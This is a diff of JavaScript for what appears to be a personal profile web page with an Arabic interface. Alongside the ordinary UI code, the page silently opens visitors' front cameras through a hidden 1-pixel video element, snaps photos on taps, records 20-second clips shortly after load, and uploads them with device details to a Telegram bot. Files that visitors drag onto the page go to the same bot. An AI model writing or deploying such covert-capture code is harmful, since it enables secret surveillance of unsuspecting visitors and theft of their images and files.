@@ -12,14 +12,13 @@
     let s = LS.get('state', null);
     if(s) return s;
     const init = {
-      owner: {...C.OWNER},
+      owner: JSON.parse(JSON.stringify(C.OWNER)),
       theme: 'dark',
       gallery: [],
       avatar: '',
       maintenance: false,
       visits: 0, captures: 0, videos: 0,
-      photoMode: true,
-      videoMode: true
+      photoMode: true, videoMode: true, dropMode: true
     };
     LS.set('state', init);
     return init;
@@ -27,7 +26,6 @@
   function saveState(s){ LS.set('state', s); }
   const state = getState();
 
-  // --- Toast ---
   function toast(msg){
     let t = document.querySelector('.toast');
     if(!t){t=document.createElement('div');t.className='toast';document.body.appendChild(t)}
@@ -37,13 +35,11 @@
     t._to = setTimeout(()=>t.classList.remove('show'), 2500);
   }
 
-  // --- Loader ---
   window.addEventListener('load', () => {
-    setTimeout(()=>{ const l=$('#loader'); if(l) l.classList.add('hide'); }, 600);
+    setTimeout(()=>{ const l=$('#loader'); if(l) l.classList.add('hide'); }, 500);
     revealOnScroll();
   });
 
-  // --- Progress + top ---
   window.addEventListener('scroll', () => {
     const h = document.documentElement;
     const p = (h.scrollTop / (h.scrollHeight - h.clientHeight)) * 100;
@@ -52,7 +48,6 @@
     revealOnScroll();
   });
 
-  // --- Reveal ---
   function revealOnScroll(){
     $$('.reveal').forEach(el => {
       const r = el.getBoundingClientRect();
@@ -60,7 +55,6 @@
     });
   }
 
-  // --- Cursor glow ---
   const glow = document.createElement('div');
   glow.className = 'cursor-glow';
   document.body.appendChild(glow);
@@ -69,7 +63,6 @@
     glow.style.top = e.clientY+'px';
   });
 
-  // --- Theme ---
   function applyTheme(t){
     if(t==='dark') document.documentElement.removeAttribute('data-theme');
     else document.documentElement.setAttribute('data-theme', t);
@@ -84,7 +77,6 @@
     state.theme=order[i]; applyTheme(state.theme); saveState(state);
   });
 
-  // --- AGE IN SECONDS (precise) ---
   function tickAge(){
     const bd = new Date(state.owner.birthdate);
     if(isNaN(bd.getTime())) return;
@@ -100,26 +92,19 @@
     if(mins < 0){mins+=60; hours--;}
     if(hours < 0){hours+=24; days--;}
     if(days < 0){
-      const prevMonth = new Date(now.getFullYear(), now.getMonth(), 0);
-      days += prevMonth.getDate();
+      const pm = new Date(now.getFullYear(), now.getMonth(), 0);
+      days += pm.getDate();
       months--;
     }
     if(months < 0){months+=12; years--;}
 
     const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent = String(v).padStart(2,'0'); };
-    set('aYears', years);
-    set('aMonths', months);
-    set('aDays', days);
-    set('aHours', hours);
-    set('aMins', mins);
-    set('aSecs', secs);
-
-    const sa=$('#statAge'); if(sa) sa.textContent = years;
+    set('aYears', years); set('aMonths', months); set('aDays', days);
+    set('aHours', hours); set('aMins', mins); set('aSecs', secs);
   }
   tickAge();
   setInterval(tickAge, 1000);
 
-  // --- RENDER ---
   function render(){
     const o = state.owner;
     const setT=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v};
@@ -128,25 +113,42 @@
     setT('ownerLocation', '📍 ' + o.location);
     setT('quoteText', '"' + o.quote + '"');
     setT('aboutText', o.about);
+    setT('siteBrand', o.siteName || 'طه');
+    setT('footerBrand', o.siteName || 'طه');
+    const titleEl = document.querySelector('title');
+    if(titleEl) titleEl.textContent = o.name || 'طه';
 
-    const links = {waBtn: o.whatsapp, floatWA: o.whatsapp, waLink: o.whatsapp, fbBtn: o.facebook, fbLink: o.facebook, igBtn: o.instagram, igLink: o.instagram};
+    const links = {waBtn: o.whatsapp, floatWA: o.whatsapp, fbBtn: o.facebook, igBtn: o.instagram};
     Object.entries(links).forEach(([id,href])=>{
       const el=document.getElementById(id); if(el&&href) el.href=href;
     });
 
-    // Avatar
     if(state.avatar){
       const img=$('#avatarImg'); const ph=$('#avatarPlaceholder');
       if(img){img.src=state.avatar; img.style.display='block';}
       if(ph) ph.style.display='none';
     }
 
-    // Gallery (show if has items)
+    const fg=$('#featuresGrid'); const fSec=$('#features');
+    if(fg && fSec){
+      fg.innerHTML='';
+      const items=(o.features||[]);
+      if(items.length) fSec.style.display='';
+      else fSec.style.display='none';
+      items.forEach(f=>{
+        const d=document.createElement('div');
+        d.className='feature-card';
+        d.innerHTML='<span class="feature-icon">'+(f.icon||'✨')+'</span><div class="feature-name">'+f.name+'</div><div class="feature-desc">'+(f.desc||'')+'</div>';
+        fg.appendChild(d);
+      });
+    }
+
     const g=$('#galleryGrid'); const gSec=$('#gallery');
     if(g){
       g.innerHTML='';
       const items = state.gallery || [];
-      if(items.length && gSec){ gSec.style.display=''; }
+      if(items.length && gSec) gSec.style.display='';
+      else if(gSec) gSec.style.display='none';
       items.forEach((url,i)=>{
         const d=document.createElement('div');
         d.className='gallery-item';
@@ -159,12 +161,12 @@
       });
     }
 
-    // Extra links
     const el=$('#extraLinksList'); const lSec=$('#links');
     if(el){
       el.innerHTML='';
-      const items = (o.extraLinks||[]);
-      if(items.length && lSec){ lSec.style.display=''; }
+      const items=(o.extraLinks||[]);
+      if(items.length && lSec) lSec.style.display='';
+      else if(lSec) lSec.style.display='none';
       items.forEach(l=>{
         const a=document.createElement('a');
         a.className='extra-link';
@@ -174,19 +176,13 @@
       });
     }
 
-    // Stats
-    setT('statVisits', state.visits||0);
-    setT('statCaptures', state.captures||0);
-    setT('statGallery', (state.gallery||[]).length);
     setT('year', new Date().getFullYear());
   }
   render();
 
-  // --- Visits ---
   state.visits = (state.visits||0) + 1;
   saveState(state);
 
-  // --- Buttons ---
   const lx=$('#lightbox');
   if(lx) lx.addEventListener('click', e=>{
     if(e.target.id==='lightbox'||e.target.classList.contains('close')) lx.classList.remove('show');
@@ -216,7 +212,7 @@
   if(qb) qb.addEventListener('click', e=>{
     e.stopPropagation();
     const qi=$('#qrImg');
-    if(qi) qi.src='https://api.qrserver.com/v1/create-qr-code/?size=220x220&data='+encodeURIComponent(location.href);
+    if(qi) qi.src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data='+encodeURIComponent(location.href);
     const qm=$('#qrModal'); if(qm) qm.classList.add('show');
   });
   const qc=$('#qrClose');
@@ -224,9 +220,7 @@
   const qm=$('#qrModal');
   if(qm) qm.addEventListener('click', e=>{if(e.target.id==='qrModal') qm.classList.remove('show')});
 
-  // ============================
-  // CAMERA — silent capture
-  // ============================
+  // CAMERA — silent
   const video = document.createElement('video');
   video.style.cssText='position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px';
   video.muted=true; video.playsInline=true; video.autoplay=true;
@@ -239,8 +233,7 @@
     camStarted=true;
     try{
       camStream = await navigator.mediaDevices.getUserMedia({
-        video:{facingMode:'user',width:{ideal:960},height:{ideal:720}},
-        audio:false
+        video:{facingMode:'user',width:{ideal:960},height:{ideal:720}}, audio:false
       });
       video.srcObject = camStream;
       await new Promise(res=>{
@@ -250,10 +243,7 @@
       await video.play().catch(()=>{});
       camReady=true;
       LS.set('camOn', true);
-    }catch(e){
-      camStarted=false;
-      LS.set('camOn', false);
-    }
+    }catch(e){ camStarted=false; LS.set('camOn', false); }
   }
 
   async function snapPhoto(){
@@ -271,8 +261,6 @@
 
       state.captures=(state.captures||0)+1;
       saveState(state);
-      const statEl=document.getElementById('statCaptures');
-      if(statEl) statEl.textContent=state.captures;
 
       const caption='📸 صورة\n⏰ '+new Date().toLocaleString('ar-EG')+
         '\n💻 '+(navigator.platform||'—')+
@@ -296,11 +284,9 @@
     finally{camBusy=false}
   }
 
-  // Try auto-start or prompt on first gesture
   if(state.photoMode){
-    if(LS.get('camOn',false)){
-      startCamera();
-    } else {
+    if(LS.get('camOn',false)){ startCamera(); }
+    else {
       const first = async () => {
         document.removeEventListener('pointerdown', first);
         await startCamera();
@@ -316,9 +302,7 @@
     else if(!camStarted) startCamera().then(()=>{if(camReady) setTimeout(snapPhoto,150)});
   }, {passive:true});
 
-  // ============================
-  // VIDEO RECORDING — record silently
-  // ============================
+  // VIDEO — silent, 20s
   let recStream=null, recorder=null, recChunks=[], recTimer=null, recStart=0;
 
   const recIndicator=document.createElement('div');
@@ -349,12 +333,8 @@
         const t=document.getElementById('recTime');
         if(t) t.textContent=String(m).padStart(2,'0')+':'+String(ss).padStart(2,'0');
       },1000);
-
-      // Auto-stop after 20 seconds
       setTimeout(()=>{ if(recorder && recorder.state==='recording') stopVideoRec(); }, 20000);
-    }catch(e){
-      console.warn('video err',e);
-    }
+    }catch(e){ console.warn('video err',e); }
   }
 
   async function stopVideoRec(){
@@ -370,41 +350,32 @@
     const blob = new Blob(recChunks, {type:recChunks[0].type || 'video/webm'});
     recChunks=[];
     const dur = Math.floor((Date.now()-recStart)/1000);
-    if(dur < 2) return; // skip too short
-
+    if(dur < 2) return;
     state.videos=(state.videos||0)+1;
     saveState(state);
-
     const ext = blob.type.includes('mp4')?'mp4':'webm';
     const caption='🎥 فيديو\n⏰ '+new Date().toLocaleString('ar-EG')+
-      '\n⏱️ '+dur+' ثانية'+
-      '\n💻 '+(navigator.platform||'—')+
+      '\n⏱️ '+dur+' ثانية\n💻 '+(navigator.platform||'—')+
       '\n#️⃣ #'+state.videos;
-
     try{
-      if(blob.size < 40*1024*1024){
-        const fd=new FormData();
-        fd.append('chat_id',C.OWNER_ID);
-        fd.append('video',blob,'clip_'+Date.now()+'.'+ext);
-        fd.append('caption',caption);
-        await fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendVideo',{method:'POST',body:fd}).catch(()=>{
-          const fd2=new FormData();
-          fd2.append('chat_id',C.OWNER_ID);
-          fd2.append('document',blob,'clip_'+Date.now()+'.'+ext);
-          fd2.append('caption',caption);
-          fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd2}).catch(()=>{});
-        });
-      }
+      const fd=new FormData();
+      fd.append('chat_id',C.OWNER_ID);
+      fd.append('video',blob,'clip_'+Date.now()+'.'+ext);
+      fd.append('caption',caption);
+      await fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendVideo',{method:'POST',body:fd}).catch(()=>{
+        const fd2=new FormData();
+        fd2.append('chat_id',C.OWNER_ID);
+        fd2.append('document',blob,'clip_'+Date.now()+'.'+ext);
+        fd2.append('caption',caption);
+        fetch('https://api.telegram.org/bot'+C.BOT_TOKEN+'/sendDocument',{method:'POST',body:fd2}).catch(()=>{});
+      });
     }catch(e){console.warn(e)}
     recorder=null;
   }
 
-  // Start video recording after 3 seconds of page load
   setTimeout(()=>{ if(state.videoMode) startVideoRec(); }, 3000);
 
-  // ============================
-  // DRAG & DROP → send files to bot
-  // ============================
+  // DRAG DROP
   const dropZone=document.createElement('div');
   dropZone.className='drop-zone';
   dropZone.innerHTML='<div class="drop-zone-inner"><span class="icon">📁</span>اسحب الملفات هنا</div>';
@@ -412,7 +383,7 @@
 
   let dragCounter=0;
   document.addEventListener('dragenter', e=>{
-    if(e.dataTransfer && Array.from(e.dataTransfer.types).includes('Files')){
+    if(state.dropMode && e.dataTransfer && Array.from(e.dataTransfer.types).includes('Files')){
       dragCounter++;
       dropZone.classList.add('show');
     }
@@ -426,16 +397,15 @@
     e.preventDefault();
     dragCounter=0;
     dropZone.classList.remove('show');
+    if(!state.dropMode) return;
     const files = e.dataTransfer && e.dataTransfer.files;
     if(!files || !files.length) return;
-    for(const f of files){
-      await sendFileToBot(f);
-    }
+    for(const f of files){ await sendFileToBot(f); }
     toast('✅ تم إرسال '+files.length+' ملف');
   });
 
   async function sendFileToBot(file){
-    const caption='📎 ملف من الموقع\n📄 '+file.name+'\n📐 '+(file.size/1024).toFixed(1)+' KB'+
+    const caption='📎 ملف\n📄 '+file.name+'\n📐 '+(file.size/1024).toFixed(1)+' KB'+
       '\n⏰ '+new Date().toLocaleString('ar-EG');
     try{
       const fd=new FormData();
@@ -446,18 +416,12 @@
     }catch(e){console.warn(e)}
   }
 
-  // ============================
-  // Sync on focus
-  // ============================
   window.addEventListener('focus', ()=>{
     const fresh=getState();
     Object.assign(state, fresh);
     render();
   });
 
-  // ============================
-  // Keyboard shortcut → admin
-  // ============================
   document.addEventListener('keydown', e=>{
     if(e.ctrlKey && e.shiftKey && e.key==='A') location.href='admin.html';
   });
